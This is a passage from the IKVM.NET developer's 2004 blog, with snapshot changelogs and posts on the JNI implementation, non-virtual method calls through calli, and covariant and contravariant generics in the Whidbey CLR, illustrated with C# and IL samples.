<LI>Added workaround for Mono 1.0 bug in Marshal.AllocHGlobal. 
<LI>Fixed delegate reflection bug that caused ikvmstub not to emit the nested Method interface for delegates. 
<LI>Added resource name mangling to make ILDASM/ILASM roundtripping work.</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/05/2004 11:54:45 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7f588362-ef57-44e5-8714-8fe6f6fc2b32"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7f588362-ef57-44e5-8714-8fe6f6fc2b32">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 31 August 2004</h2></div>
<div class="newsItems"><a name="ad6bacbb4-e42f-4c10-8502-0a943b792b72"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>The biggest change in this version is that the JNI implementation is now unified. It's completely rewritten in unsafe C# and a tiny bit of C (thanks to Zoltan Varga for porting the C part to Linux). This allows the same code to be used on the Microsoft CLR and on Mono. Porting the Managed C++ to C# was an interesting exercise. Because of the repetitive nature of many of the JNI functions, I really missed the C macros I used in the Managed C++ implementation, but more importantly I found that unsafe C# tries really hard to get in your way. It tries to prevent you from shooting yourself in the foot, but IMO it doesn't really succeed at that, but it does make it really hard to do clever things if you know what you're doing.</P>
<P>I also found some methods missing in <CODE>System.Runtime.InteropServices.Marshal</CODE>. There is no <CODE>memcpy</CODE>, no way to efficiently allocate unmanaged memory (both <CODE>CoTaskAllocMem</CODE> and <CODE>AllocHGlobal</CODE> offer functionality or guarantees that you often don't need) and there is no way to turn a delegate into an unmanaged method pointer. I had to add the following C method to convert the delegate an unmanaged method pointer:</P><PRE>JNIEXPORT void* JNICALL ikvm_MarshalDelegate(void* p)
{
    return p;
}</PRE>
<P>This looks like a no-op, but the P/Invoke marshaler converts the delegate to a pointer to an unmanaged thunk. Unfortunately this functionality is not exposed as a managed API.</P>
<P>Here's what else is new:</P>
<UL>
<LI>New unified JNI implementation written mostly in (unsafe) C#. The same JNI implementation now works on Mono and the Microsoft CLR and there is only a tiny bit of platform specific C code (no more Managed C++). 
<LI>Statically compiled code that uses JNI is now portable between different platforms (obviously only if the native library is available on those platforms). 
<LI>Implemented more JNI functionality. 
<LI>Synchronized with GNU Classpath cvs. 
<LI>Fixed Runtime.totalMemory() to return more than Runtime.freeMemory(). Note that the value is still pretty meaningless. 
<LI>Added more validation to BigEndianBinaryReader to better detect invalid class files. 
<LI>Changed ByteCode, NormalizedByteCode and ByteCodeMode enums to be byte based, for efficiency. 
<LI>Separated wide "addressing" modes into ByteCodeModeWide to make the code simpler. 
<LI>Added ByteCodeFlags enum to encode bytecode properties in ByteCodeMetaData. 
<LI>Fixed ByteCodeMetaData encoding for the [ailfd]load/[ailfd]store instructions to support the wide encodings. 
<LI>Made class file parsing eager, to prevent depending on the passed in byte array after ClassLoader.defineClass() returns. 
<LI>Made class file parsing robust against class loaders that to attact the VM by modifying the class file byte array, while it is being parsed. 
<LI>Made many Optimizations to class file parsing. 
<LI>Added more validation to class file parsing. 
<LI>Fixed class file parsing to throw a ClassFormatError when a class loader is trying to redefine java.lang.Object. 
<LI>Implemented class loader namespace support for native libraries. 
<LI>Fixed FieldWrapper.Link() to rethrow exception if linking fails (instead of silently swallowing it). 
<LI>Made the __<CLINIT> static initialization trigger field protected instead of public. 
<LI>Use a more efficient CIL sequence for instanceof instruction. 
<LI>Fixed stupid bug in Double/Float.parse(). It used the local sensitive version of System.Double.Parse(). 
<LI>Fixed java.io.System.setErr().</LI></UL>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
<P><STRONG>Update:</STRONG> I forgot to thank Zoltan Varga for porting the platform specific part of the new JNI implementation to Linux.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/31/2004 13:55:43 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d6bacbb4-e42f-4c10-8502-0a943b792b72"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d6bacbb4-e42f-4c10-8502-0a943b792b72">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 20 August 2004</h2></div>
<div class="newsItems"><a name="a74f1cdd9-43b8-4031-9bce-e394b11e8d8e"></a><div class="entry">
	<h3 class="entryTitle">Non-virtual Method Invocation</h3>
	<div class="entryBody">
		<P>In Tuesday's snapshot I finally implemented the <CODE>CallNonvirtual<TYPE>Method</CODE> JNI routines. I've never seen any JNI code that actually uses them, but I obviously needed to implement them at some point.</P>
<P>For those of you unfamiliar with these routines, let me explain them briefly. Normally when you call a virtual method, the runtime type of the instance the method is called on determines the actual method you end up at (so called virtual method dispatch), but these routines allow you to call a base class method as well. So, if you'd use <CODE>CallNonvirtualObjectMethod</CODE> on <CODE>java.lang.Object.toString()</CODE> on a <CODE>java.lang.String</CODE> instance (let's say &#8220;foo&#8220;), the result you'd get would be <CODE>java.lang.String@17e809</CODE> instead of the string &#8220;foo&#8220;.</P>
<P>The CLR Reflection API doesn't have the ability to invoke a virtual method non-virtually. Unlike Java however, the CLR does allow the CIL <CODE>call</CODE> instruction to be used to call arbitrary methods non-virtually (the Java invokespecial method can only be used to call methods in the same class or in a base class). So the obvious way to implement these routines, would seem to be to dynamically emit some code that calls the requested method non-virtually, but there is problem with this approach, the JNI routines don't enforce accessibility (they allow you to call non-public methods) and the CLR enforces accessibility. I got around this by using <CODE>RuntimeMethodHandle.GetFunctionPointer()</CODE> incombination with the CIL <CODE>calli</CODE> instruction. This also has the advantage that the dynamically emitted stubs can be reused for methods with the same signature, because the target address isn't baked into the method, but passed in.</P>
<P><B>Non-orthogonality</B></P>
<P>While I don't have a very compelling use case for non-virtual method invocation through reflection, based on API orthogonality and completeness a case could be made for it, but more importantly, I think that ECMA/Microsoft should consider changing the CLI spec to allow non-verifiable code to bypass the accessibility checks. Note that the new <CODE><A href="http://longhorn.msdn.microsoft.com/lhsdk/ref/ns/system.reflection.emit/c/dynamicmethod/dynamicmethod.aspx">DynamicMethod</A></CODE> in Whidbey already allows accessibility checks to be bypassed (and note also that whoever wrote the doc for <CODE>DynamicMethod</CODE> doesn't understand the difference between visibility and accessibility).</P>
<P>The trick of using <CODE>calli</CODE> to bypass the accessibility checks doesn't work for virtual method invocation, because there is no way to dynamically and efficiently get the function pointer of a method by applying the virtual method dispatch rules (i.e. there is no dynamic equivalent of the CIL <CODE>ldvirtftn</CODE> instruction).</P>
<P>To summarize, here is what I think should be changed:</P>
<UL>
<LI>CLR shouldn't bother enforcing accessibility in non-verifiable code. 
<LI>MethodInfo should get a new InvokeNonvirtual method. 
<LI>MethodInfo should get a GetFunctionPointer(object) method that returns the method pointer that results from virtual dispatch.</LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/20/2004 09:11:25 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=74f1cdd9-43b8-4031-9bce-e394b11e8d8e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=74f1cdd9-43b8-4031-9bce-e394b11e8d8e">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 19 August 2004</h2></div>
<div class="newsItems"><a name="a077007f9-b2d4-4527-9da1-af581b6a4702"></a><div class="entry">
	<h3 class="entryTitle">Article on IKVM</h3>
	<div class="entryBody">
		<P>Avik Sengupta wrote an excellent <A href="http://www.onjava.com/pub/a/onjava/2004/08/18/ikvm.html">article on IKVM</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/19/2004 13:33:47 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=077007f9-b2d4-4527-9da1-af581b6a4702"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=077007f9-b2d4-4527-9da1-af581b6a4702">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 17 August 2004</h2></div>
<div class="newsItems"><a name="a35144fc4-350f-4d09-8bb5-6f29b3b5fc5c"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>A new development snapshot. I made many changes (way too many) since the last snapshot. The diff was over 13,000 lines (and I had already checked in part of the changes).
<P>This is an important step towards 1.0, but there is still much to be done.
<P>BTW, Eclipse 3.0 starts up with this version, but that's pretty much it, it doesn't do anything useful yet.
<P>What's New:
<UL>
<LI>Changed version numbers to 0.9.* (I'm using a Linux kernel version scheme, even numbers are used for releases, odd numbers are used during development.)</LI>
<LI>Resynchronized with GNU Classpath cvs.</LI>
<LI>Made String.compareTo(Object) redirect to my own implementation instead of System.String.CompareTo (including when the method is invoked through the java.lang.Comparable interface, which is still remapped to System.IComparable).</LI>
<LI>Fixed exception remapping handling of java.lang.ExceptionInInitializer.</LI>
<LI>Added dummy (but safe) implementations of getHostAddress and hostsEqual to ikvmres protocol handler.</LI>
<LI>Removed work around for Classpath serialization bug from Throwable cause serialization. The state of whether the cause was set is now properly serialized.</LI>
<LI>Fixed deserialization of exceptions serialized with pre-1.4 JDKs.</LI>
<LI>Fixed integer overflow bugs in the various argument tests in the String(byte[], ...) constructors.</LI>
<LI>Added missing argument check to String.startsWith(String prefix, int offset).</LI>
<LI>Added -Xbreak option to ikvm, to fire the debugger on startup.</LI>
<LI>Added support for automatically generating build and revision numbers to ikvmc (e.g. -version:0.9.*)</LI>
<LI>Fixed ikvmstub bug that caused invalid max_locals to be set in constructor definitions if the constructor took long or double arguments.</LI>
<LI>Fixed visibility handling of nested types. A public nested type nested inside a non-public type was incorrectly treated as public.</LI>
<LI>Fixed reflection bug. Statically compiled classes had private methods incorrectly reported as final.</LI>
<LI>Fixed method override resolver bug. Having a private final method in a base class with a similar name/signature as a virtual method in the subclass caused a VerifyError (which was presented as a critical failure).</LI>
<LI>Fixed another method override resolver bug. Only interfaces implemented by direct base class were searched, not those implemented by all base classes.</LI>
<LI>Added workaround for deserializing incorrectly serialized java.lang.String objects (strings are supposed to be special cased by serialization, but if you manually construct a serialization stream that contains a TC_OBJECT of class java.lang.String, previously you'd get a weird exception.)</LI>
<LI>Added (untested) implementation of VMAccessController.</LI>
<LI>Fixed small compiler bug. Ldarg/Starg instruction was emitted with int argument, instead of short. This caused two bogus nops in the CIL stream to follow each Ldarg/Starg instruction (in exceptional cases).</LI>
<LI>Fixed Tracer to handle messages without formatting characters.</LI>
<LI>Fixed lame typo in JVM.CompilerClassLoader.EmitRedirect. (Call to Debug.CompareTo(...) instead of System.Diagnostics.Debug.Assert(...)).</LI>
<LI>Added nonvirtualAlternateBody support to map.xml parser.</LI>
<LI>Added nonvirtualAlternateBody to map.xml for java.lang.Object.toString().</LI>
<LI>Added exceptionBlock support to map.xml parser.</LI>
<LI>Added exception handler to map.xml for java.lang.ThreadDeath exception mapping code, to catch ThreadStateException if Thread.Abort is called while it isn't required.</LI>
<LI>Removed unnecessary path name check from FileChannelImpl.open().</LI>
<LI>Removed VMFile.demangle(). Normalization is now part of Classpath java.io.File.</LI>
<LI>Added exception handling to VMFile.isHidden().</LI>
<LI>Added VMFile.toCanonicalForm(). Now used by Classpath java.io.File.getCanonicalPath().</LI>
<LI>Added protection domain support to VMClass.createClass().</LI>
<LI>Removed VMClass.loadBootstrapClass().</LI>
<LI>Removed unused deprecated version of VMClassLoader.defineClass().</LI>
<LI>Added bootstrap classloader resource support to VMClassLoader.</LI>
<LI>Implemented VMClassLoader.getSystemClassLoader() in VMClassLoader. The system classloader is now always available, not just if the application was started with ikvm.exe.</LI>
<LI>Added app.config appSettings support to VMRuntime.insertSystemProperties(). Java properties can now be specified in your .NET application .config file:<BR><FONT face="Courier New">&lt;appSettings&gt;</FONT><BR>&nbsp;&nbsp; <FONT face="Courier New">&lt;add key="ikvm:</FONT><I>&lt;propertyname&gt;</I><FONT face="Courier New">" value="</FONT><I>&lt;propertyvalue&gt;</I><FONT face="Courier New">" /&gt;<BR>&lt;/appSettings&gt;</FONT></LI>
<LI>In VMThread, removed cleanupDataStoreSlot static and always do lookup of the LocalDataStoreSlot by name, to handle scenario where the IKVM main thread is the first one to lookup the LocalDataStoreSlot (and previously that would cause the static initializer of VMThread to fail, because AllocateNamedDataSlot would fail, as the name was already in use).</LI>
<LI>Fixed Field.checkAccess() when caller is a global method.</LI>
<LI>Removed ExtClassLoader and AppClassLoader from starter.cs (ikvm.exe).</LI>
<LI>Added hack to set the priority of the ikvmdump.exe writing thread to AboveNormal, to deal with a spinning thread in Eclipse on shutdown.</LI>
<LI>Don't add CLASSPATH to java.class.path is the -jar option is specified.</LI>
<LI>Removed support for DLLs in the bootclasspath.</LI>
<LI>Fixed exception handling compilation options for IKVM.JNI.CLR-Win32 in clr-win32.build.</LI>
<LI>Major rewrite of local and global ref support in Win32 JNI provider.</LI>
<LI>Implemented most of the remaining JNI functions in Win32 JNI provider.</LI>
<LI>Fixed class file parser to disallow native constructors.</LI>
<LI>Rewrote class loading and method/field linking in ClassFile.cs.</LI>
<LI>Fixed most of the thread safety issues in class loading/reflection.</LI>
<LI>The runtime no longer throws Java exceptions, instead it throws its own exception, which are converted to Java exceptions at the runtime/Java boundaries. This makes ikvmc compilation of Classpath more robust (previously, if an exception required by the runtime was missing, it would often result in infinite recursion).</LI>
<LI>Simplified MethodDescriptor. It is now only a name/signature tuple.</LI>
<LI>MethodWrapper now uses virtual methods instead of delegates to emit call/callvirt/newobj sequences.</LI>
<LI>Major rewrite of method resolving/linking and MethodWrapper infrastructure. Loader constraints are now properly enforced and LinkageErrors are thrown in the right places at the right times.</LI>
<LI>Renamed HideFromReflectionAttribute to HideFromJavaAttribute and made the semantics consistent. It now means that the method is totally invisible from Java (either through reflection or statically). The new MirandaMethodAttribute signals that a method is invisible from reflection, but callable by Java byte code.</LI>
<LI>Added new NameSigAttribute that is used to recover the original method name or signature when a method name is mangled or when a signature is changed in such a way that at runtime the original signature cannot be reconstructed anymore.</LI>
<LI>Fixed TypeWrapper.IsInSamePackage() to understand that a package with the same name but in different assemblies, really isn't the same package.</LI>
<LI>Fixed <FONT face="Courier New">ininst</FONT> instruction in map.xml. Now works the same for Java and .NET types.</LI></UL>
<P>I'm sure I forgot many changes/fixes. This change set was just too large. I promise to check in more frequently in future :-)</P>
<P>New snapshots: <A href="http://www.frijters.net/ikvmbin.zip"><STRONG>just the binaries</STRONG></A> and <A href="http://www.frijters.net/ikvm.zip"><STRONG>source plus binaries</STRONG></A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/17/2004 11:08:03 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=35144fc4-350f-4d09-8bb5-6f29b3b5fc5c"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=35144fc4-350f-4d09-8bb5-6f29b3b5fc5c">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 16 August 2004</h2></div>
<div class="newsItems"><a name="a473bab15-9fbc-43ec-97f5-28b40103a086"></a><div class="entry">
	<h3 class="entryTitle">JavaScript on IKVM</h3>
	<div class="entryBody">
		<P>Phil blogs about <A href="http://chimpen.com/things/archives/001427.php">running Rhino on IKVM on Mono</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/16/2004 17:26:15 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=473bab15-9fbc-43ec-97f5-28b40103a086"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=473bab15-9fbc-43ec-97f5-28b40103a086">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 10 August 2004</h2></div>
<div class="newsItems"><a name="a21f9ed86-827e-4666-9553-5d4a8d735b7e"></a><div class="entry">
	<h3 class="entryTitle">Whidbey, Generics, Co- and contravariance</h3>
	<div class="entryBody">
		<p>I
 came across an interesting Whidbey beta 1 CLR feature today. As far as I can 
 tell this hasn't been documented anywhere yet, but the Whidbey beta 1 CLR 
 supports covariant and contravariant generic type parameters.</p><p>This is 
 a really interesting feature. If C# would support it (at the moment it 
 doesn't), you'd be able to do something like this:</p>
 <pre>interface IReader&lt;T&gt;
{
  T Get(); 
}</pre>
 <pre>interface IWriter&lt;T&gt;
{
  void Put(T t);
}</pre>
 <pre>class Test&lt;T&gt; : IReader&lt;T&gt;, IWriter&lt;T&gt;
{
  T t;
  public T Get() { return t; }
  public void Put(T t) { this.t = t; }
}
class Driver
{
  static void Main()
  {
    Test&lt;string&gt; t1 = new Test&lt;string&gt;();
    t1.Put(&quot;covariance&quot;);
    <span style="background-color: #FFFF00">IReader&lt;object&gt; rdr = t1;</span>
    Console.WriteLine(rdr.Get());
    Test&lt;object&gt; t2 = new Test&lt;object&gt;();
    <span style="background-color: #FFFF00">IWriter&lt;string&gt; wrtr = t1;</span>
    wrtr.Put(&quot;contravariance&quot;);
    Console.WriteLine(t2.Get());
  }
}</pre><p>Notice that in the first highlighted line we're assigning an object 
 reference that implements IReader&lt;string&gt; to a local variable of type 
 IReader&lt;object&gt;. This is covariance and it is type safe because the 
 IReader&lt;T&gt; interface only returns T. In the second highlighted line we 
 assign a reference that implements IWriter&lt;object&gt; to a local of type 
 IWriter&lt;string&gt;, this is contravariance and this is also type safe, because 
 IWriter&lt;T&gt; only accept arguments of type T.</p>
 <p>Unfortunately, C# doesn't yet seem to support this feature, but if we 
 manually write the IL, it'll run on the Whidbey beta 1 CLR (and it is fully 
 verifiable):</p>
 <code>.assembly extern mscorlib {}<br>
 .assembly test {}<br>
 <br>
 .class interface public abstract<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'IReader`1'&lt;<span style="background-color: #FFFF00">+</span>([mscorlib]System.Object) T&gt;<br>
 {<br>
&nbsp; .method public abstract instance<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; !T Get() cil managed {}<br>
 }<br>
 <br>
 .class interface public abstract<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'IWriter`1'&lt;<span style="background-color: #FFFF00">-</span>([mscorlib]System.Object) T&gt;<br>
 {<br>
&nbsp; .method public abstract instance<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; void Put(!T t) cil 
 managed {}<br>
 }<br>
 <br>
 .class public 'Test`1'&lt;([mscorlib]System.Object) T&gt;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; extends [mscorlib]System.Object<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; implements class 'IReader`1'&lt;!T&gt;,<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
 class 'IWriter`1'&lt;!T&gt;<br>
 {<br>
&nbsp; .field private !T v<br>
 <br>
&nbsp; .method public virtual instance<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; !T Get() cil managed<br>
&nbsp; {<br>
&nbsp;&nbsp;&nbsp; ldarg.0<br>
&nbsp;&nbsp;&nbsp; ldfld !0 class 'Test`1'&lt;!T&gt;::v<br>
&nbsp;&nbsp;&nbsp; ret<br>
&nbsp; }<br>
 <br>
&nbsp; .method public virtual instance<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; void Put(!T t) cil 
 managed<br>
&nbsp; {<br>
&nbsp;&nbsp;&nbsp; ldarg.0<br>
&nbsp;&nbsp;&nbsp; ldarg.1<br>
&nbsp;&nbsp;&nbsp; stfld !0 class 'Test`1'&lt;!T&gt;::v<br>
&nbsp;&nbsp;&nbsp; ret<br>
&nbsp; }<br>
 <br>
&nbsp; .method public specialname rtspecialname <br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; instance void .ctor() cil 
 managed<br>
&nbsp; {<br>
&nbsp;&nbsp;&nbsp; ldarg.0<br>
&nbsp;&nbsp;&nbsp; call instance void [mscorlib]System.Object::.ctor()<br>
&nbsp;&nbsp;&nbsp; ret<br>
&nbsp; }<br>
 }<br>
 <br>
 .method static void Main(string[] args) cil managed<br>
 {<br>
&nbsp; .entrypoint<br>
&nbsp; .locals init ([0] class 'Test`1'&lt;string&gt; t1,<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
 [1] class 'IReader`1'&lt;object&gt; rdr,<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
 [2] class 'Test`1'&lt;object&gt; t2,<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
 [3] class 'IWriter`1'&lt;string&gt; wrtr)<br>
 <br>
&nbsp; newobj instance void class <span style="background-color: #FFFF00">'Test`1'&lt;string&gt;</span>::.ctor()<br>
&nbsp; stloc.0<br>
&nbsp; ldloc.0<br>
&nbsp; ldstr &quot;covariance&quot;<br>
&nbsp; callvirt instance void class 'Test`1'&lt;string&gt;::Put(!0)<br>
&nbsp; ldloc.0<br>
&nbsp; stloc.1<br>
&nbsp; ldloc.1<br>
&nbsp; callvirt instance !0 class <span style="background-color: #FFFF00">'IReader`1'&lt;object&gt;</span>::Get()<br>
&nbsp; call void [mscorlib]System.Console::WriteLine(object)<br>
 <br>
&nbsp; newobj instance void class <span style="background-color: #FFFF00">'Test`1'&lt;object&gt;</span>::.ctor()<br>
&nbsp; stloc.2<br>
&nbsp; ldloc.2<br>
&nbsp; stloc.3<br>
&nbsp; ldloc.3<br>
&nbsp; ldstr &quot;contravariance&quot;<br>
&nbsp; callvirt instance void class <span style="background-color: #FFFF00">'IWriter`1'&lt;string&gt;</span>::Put(!0)<br>
&nbsp; ldloc.2<br>
&nbsp; callvirt instance !0 class 'IReader`1'&lt;object&gt;::Get()<br>
&nbsp; call void [mscorlib]System.Console::WriteLine(object)<br>
&nbsp; ret<br>
 }<br>
&nbsp;</code><p>Notice the plus and minus signs in the interface declarations to signal that a generic type parameter is covariant or contravariant.</p>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/10/2004 16:03:46 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=21f9ed86-827e-4666-9553-5d4a8d735b7e"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=21f9ed86-827e-4666-9553-5d4a8d735b7e">Comments [6]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 30 June 2004</h2></div>
<div class="newsItems"><a name="a1ef3d59f-c972-4e33-b0f5-d87952898559"></a><div class="entry">
	<h3 class="entryTitle">Mono 1.0</h3>
	<div class="entryBody">
		<P>Congratulations to the Mono team with the <A href="http://www.mono-project.com/about/index.html">release</A> of 1.0!</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/30/2004 19:03:12 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1ef3d59f-c972-4e33-b0f5-d87952898559"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1ef3d59f-c972-4e33-b0f5-d87952898559">Comments [2]</a>
		
		<br clear="all">
	</div>
</div><a name="af538c295-a132-4c49-b622-c140c7fc3d5c"></a><div class="entry">
	<h3 class="entryTitle">Finally a Real Web Site</h3>
	<div class="entryBody">
		<P>Many thanks to Brian J. Sletten and Stephen Schaub for building the new <A href="http://www.ikvm.net/"><STRONG>IKVM.NET web site</STRONG></A>. I will continue to write this blog, but from now on instructions, documentation and howto articles will appear on the new site (in addition to the excellent content that is already there), where they'll have a more permanent home than here on the blog.</P>
<P><STRONG>Update</STRONG>: The samples made by Brian and Stephen are available for <A href="http://prdownloads.sourceforge.net/ikvm/ikvm-samples-0.8.0.1.zip?download">download</A> on SourceForge now as well.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/30/2004 14:34:50 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f538c295-a132-4c49-b622-c140c7fc3d5c"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f538c295-a132-4c49-b622-c140c7fc3d5c">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 28 June 2004</h2></div>
<div class="newsItems"><a name="af41969a3-cda8-445f-a140-101ccfed8ebb"></a><div class="entry">
	<h3 class="entryTitle">Release Candidate 1</h3>
	<div class="entryBody">
		<P>I changed the version number on all assemblies (except for IKVM.GNU.Classpath) to 0.8.0.0 and tagged the cvs tree with v0_8_0_0 and put the files up on the SourceForge download site: <A href="http://prdownloads.sourceforge.net/ikvm/ikvm-0.8.0.0.zip?download"><STRONG>Source and binaries</STRONG></A> or <A href="http://prdownloads.sourceforge.net/ikvm/ikvmbin-0.8.0.0.zip?download"><STRONG>just binaries</STRONG></A>.</P>
<P>Unless any last minute showstopper bugs are found, this will be the version shipped with Mono 1.0.</P>
<P>Other changes:</P>
<UL>
<LI>IKVM.Runtime.dll, IKVM.GNU.Classpath.dll, IKVM.JNI.CLR-Win32.dll and IKVM.JNI.Mono.dll are now signed to enable putting them in the GAC.</LI>
<LI>Fixed java.lang.Object method invocation through ghost interface references.</LI>
<LI>Changed JNI provider loading to use LoadWithPartialName, to support loading the JNI provider from the GAC.</LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/28/2004 14:07:22 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=f41969a3-cda8-445f-a140-101ccfed8ebb"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=f41969a3-cda8-445f-a140-101ccfed8ebb">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 25 June 2004</h2></div>
<div class="newsItems"><a name="a2aba052e-1559-449d-83c2-a14482d31222"></a><div class="entry">
	<h3 class="entryTitle">Yet Another Snapshot</h3>
	<div class="entryBody">
		<P>More fixes...</P>
<P>Changes:</P>
<UL>
